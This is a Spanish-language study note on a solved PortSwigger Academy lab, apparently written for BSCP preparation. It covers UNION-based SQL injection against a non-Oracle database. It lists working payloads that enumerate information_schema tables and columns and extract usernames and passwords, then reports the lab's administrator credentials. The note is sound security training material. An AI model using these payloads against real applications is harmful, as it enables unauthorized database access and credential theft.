---
tipo: lab
vuln: sqli
nivel: practitioner
tags: [bscp, tipo/lab, vuln/sqli, nivel/practitioner, estado/resuelto]
fase: [1-acceso]
url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
estado: resuelto
---

# SQL Injection · Lab 06 — Listing database contents on non-Oracle databases (practitioner) ✅

## Objetivo
Mostrar los contenidos (nombre de tablas, columnas y datos) de la base de datos que **no es Oracle** mediante una vulnerabilidad SQL Injection en el filtro de categoría de productos.

## Fase(s)
- 1-acceso

## Pasos realizados
1. Confirmada la vulnerabilidad con `'` y determinado que la consulta original tiene **2 columnas**, la primera visible.
2. Enumerada la tabla de usuarios con:
   ```
   '+UNION SELECT table_name, NULL FROM information_schema.tables-- 
   ```
   → `users_xdkvak`.
3. Enumeradas las columnas de esa tabla:
   ```
   '+UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xdkvak'-- 
   ```
   → `email`, `password_pigxaj`, `username_axxovl`.
4. Extraídos los valores reales:
   - Usuarios:
     ```
     '+UNION SELECT username_axxovl, NULL FROM users_xdkvak-- 
     ```
   - Contraseñas:
     ```
     '+UNION SELECT password_pigxaj, NULL FROM users_xdkvak-- 
     ```
   Resultado: `administrator / npjqvk44t83kxjv344ud`.
5. Con esas credenciales se logró iniciar sesión como administrador, completando el lab.

## Payload usado (solución real)
```
# Enumerar tabla de usuarios
+' UNION SELECT table_name, NULL FROM information_schema.tables-- 

# Enumerar columnas de la tabla
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xdkvak'-- 

# Obtener usuarios
+' UNION SELECT username_axxovl, NULL FROM users_xdkvak-- 

# Obtener contraseñas
+' UNION SELECT password_pigxaj, NULL FROM users_xdkvak-- 
```

## Qué generalizo
- **Patrón:** para bases de datos que no son Oracle, usar `information_schema.tables` y `information_schema.columns` con `UNION SELECT` permite listar tablas y columnas.
- **Patrón de extracción:** una vez conocida la tabla y sus columnas, basta con `UNION SELECT <col1>, NULL FROM <tabla>` (o `UNION SELECT <col1>, <col2> FROM <tabla>` si ambas columnas son visibles) para obtener los datos.

## Enlace academy
- https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
